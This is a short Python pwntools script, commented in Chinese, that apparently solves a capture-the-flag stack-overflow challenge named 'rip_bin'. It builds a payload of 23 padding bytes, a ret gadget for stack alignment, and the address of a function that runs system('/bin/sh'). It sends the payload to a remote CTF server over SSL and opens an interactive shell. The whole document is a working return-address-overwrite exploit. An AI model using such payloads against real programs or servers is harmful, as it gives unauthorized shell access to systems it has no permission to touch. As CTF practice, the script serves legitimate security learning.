from pwn import *

# fun 函数地址，执行 system("/bin/sh")
fun_addr = 0x401186
# ret gadget，用于修复栈对齐（x86-64 中 system 要求 16 字节对齐）
ret_gadget = 0x401185  # main 函数末尾的 ret

# buf 从 rbp-0xf 开始，到 saved rbp 需要 0xf 字节，再覆盖 saved rbp 8 字节
# 偏移 = 0xf + 8 = 23
# 加一个 ret gadget 修正栈对齐后再跳转到 fun
payload = b'A' * 23 + p64(ret_gadget) + p64(fun_addr)

# 本地测试
# io = process("./rip_bin")

# 远程
io = remote("5015efcd431c147af9057d4d.tcp-ctf2.dasctf.com", 9999, ssl=True)

io.sendline(payload)
io.interactive()
